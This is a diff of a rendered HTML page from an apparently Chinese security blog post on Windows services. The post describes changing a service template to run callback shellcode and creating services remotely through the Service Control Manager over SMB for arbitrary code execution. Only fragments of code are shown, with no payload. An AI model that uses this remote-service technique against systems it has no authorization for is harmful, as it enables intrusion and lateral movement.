+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">117
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">118
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">119
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">120
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">121
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">122
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">123
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">124
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">125
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">126
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">127
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">128
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">129
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">130
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">131
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">132
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">133
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">134
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">135
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">136
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">137
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">138
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">139
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">140
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">141
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">142
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">143
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">144
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">145
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">146
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">147
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">148
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">149
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">150
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">151
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">152
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">153
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">154
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">155
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">156
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">157
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c++ data-lang=c++><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;Windows.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>  
 </span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#75715e>// Windows 服务代码模板
 </span></span></span><span style=display:flex><span><span style=color:#75715e>////////////////////////////////////////////////////////////////////////////////////
 </span></span></span><span style=display:flex><span><span style=color:#75715e>// sc create Monitor binpath= Monitor.exe
@@ -221,8 +444,133 @@
 </span></span><span style=display:flex><span>    WriteToLog(<span style=color:#e6db74>&#34;service stopped&#34;</span>);
 </span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span>;
 </span></span><span style=display:flex><span>}
-</span></span></code></pre></div><p>源代码：<a href=https://github.com/Rvn0xsy/MyWin32CPP/blob/master/WindowsService.cpp>https://github.com/Rvn0xsy/MyWin32CPP/blob/master/WindowsService.cpp</a></p><p>创建一个控制台应用程序，将源代码编译后就可以创建服务了，该服务会每隔5秒向<code>D:\log.txt</code></p><p>写入信息。这里如果展开讲会花费不少时间，我直接把<code>SERVICE_RUNNING</code> 状态下的代码进行更改，使其执行Shellcode上线。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c++ data-lang=c++><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;Windows.h&gt;</span><span style=color:#75715e>
-</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;  </span><span style=color:#75715e>
+</span></span></code></pre></td></tr></table></div></div><p>源代码：<a href=https://github.com/Rvn0xsy/MyWin32CPP/blob/master/WindowsService.cpp>https://github.com/Rvn0xsy/MyWin32CPP/blob/master/WindowsService.cpp</a></p><p>创建一个控制台应用程序，将源代码编译后就可以创建服务了，该服务会每隔5秒向<code>D:\log.txt</code></p><p>写入信息。这里如果展开讲会花费不少时间，我直接把<code>SERVICE_RUNNING</code> 状态下的代码进行更改，使其执行Shellcode上线。</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 12
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 13
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 14
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 15
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 16
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 17
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 18
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 19
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 20
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 21
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 22
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 23
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 24
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 25
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 26
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 27
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 28
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 29
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 30
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 31
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 32
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 33
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 34
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 35
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 36
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 37
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 38
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 39
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 40
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 41
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 42
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 43
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 44
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 45
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 46
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 47
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 48
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 49
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 50
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 51
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 52
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 53
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 54
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 55
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 56
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 57
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 58
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 59
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 60
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 61
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 62
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 63
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 64
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 65
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 66
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 67
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 68
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 69
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 70
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 71
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 72
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 73
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 74
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 75
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 76
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 77
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 78
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 79
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 80
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 81
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 82
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 83
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 84
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 85
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 86
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 87
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 88
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 89
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 90
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 91
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 92
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 93
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 94
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 95
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 96
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 97
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 98
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 99
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">100
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">101
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">102
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">103
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">104
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">105
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">106
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">107
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">108
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">109
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">110
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">111
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">112
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">113
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">114
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">115
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">116
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">117
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">118
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">119
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">120
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">121
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">122
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">123
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">124
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">125
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c++ data-lang=c++><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;Windows.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>  
 </span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#75715e>// Windows 服务代码模板
 </span></span></span><span style=display:flex><span><span style=color:#75715e>////////////////////////////////////////////////////////////////////////////////////
 </span></span></span><span style=display:flex><span><span style=color:#75715e>// sc create Monitor binpath= Monitor.exe
@@ -346,12 +694,60 @@
 </span></span><span style=display:flex><span>    }
 </span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span>;
 </span></span><span style=display:flex><span>}
-</span></span></code></pre></div><h2 id=0x06-使用windows-api远程管理服务>0x06 使用Windows API远程管理服务</h2><p>前面说到，Windows的服务都由服务控制管理器（SCM：<code>Services Control Manager</code>）进行管理，我们可以通过Windows API去连接SCM，当服务程序上传到服务器上以后，创建一个服务，把<code>binpath</code>指向服务程序的路径，再对服务进行启动就可以达到任意代码执行的效果。</p><p>注意：远程连接SCM还是走的SMB协议 445端口，SMB V2可以明显看到流量内容。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c++ data-lang=c++><span style=display:flex><span>SC_HANDLE <span style=color:#a6e22e>OpenSCManagerA</span>(
+</span></span></code></pre></td></tr></table></div></div><h2 id=0x06-使用windows-api远程管理服务>0x06 使用Windows API远程管理服务</h2><p>前面说到，Windows的服务都由服务控制管理器（SCM：<code>Services Control Manager</code>）进行管理，我们可以通过Windows API去连接SCM，当服务程序上传到服务器上以后，创建一个服务，把<code>binpath</code>指向服务程序的路径，再对服务进行启动就可以达到任意代码执行的效果。</p><p>注意：远程连接SCM还是走的SMB协议 445端口，SMB V2可以明显看到流量内容。</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c++ data-lang=c++><span style=display:flex><span>SC_HANDLE <span style=color:#a6e22e>OpenSCManagerA</span>(
 </span></span><span style=display:flex><span>  LPCSTR lpMachineName, <span style=color:#75715e>// 目标计算机的名称。
 </span></span></span><span style=display:flex><span><span style=color:#75715e></span>  LPCSTR lpDatabaseName, <span style=color:#75715e>// 服务控制管理器数据库的名称
 </span></span></span><span style=display:flex><span><span style=color:#75715e></span>  DWORD  dwDesiredAccess <span style=color:#75715e>// 访问权限列表
 </span></span></span><span style=display:flex><span><span style=color:#75715e></span>);
-</span></span></code></pre></div><p>如果当前用户在连接到另一台计算机上的服务时没有适当的访问权限，则 <code>OpenSCManager</code>函数调用将失败。若要远程连接到服务，请在调用<code>OpenSCManager</code>之前使用LOGON32_LOGON_NEW_CREDENTIALS 调用<code>LogonUser</code>函数，然后调用<code>ImpersonateLoggedOnUser</code>。</p><p>这里需要注意的是，通过<code>WNetAddConnection2</code>认证后，再去调用OpenSCManager是不需要认证的。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c++ data-lang=c++><span style=display:flex><span>BOOL <span style=color:#a6e22e>CreateServiceWithSCM</span>(LPCWSTR lpwsSCMServer, LPCWSTR lpwsServiceName, LPCWSTR lpwsServicePath)
+</span></span></code></pre></td></tr></table></div></div><p>如果当前用户在连接到另一台计算机上的服务时没有适当的访问权限，则 <code>OpenSCManager</code>函数调用将失败。若要远程连接到服务，请在调用<code>OpenSCManager</code>之前使用LOGON32_LOGON_NEW_CREDENTIALS 调用<code>LogonUser</code>函数，然后调用<code>ImpersonateLoggedOnUser</code>。</p><p>这里需要注意的是，通过<code>WNetAddConnection2</code>认证后，再去调用OpenSCManager是不需要认证的。</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
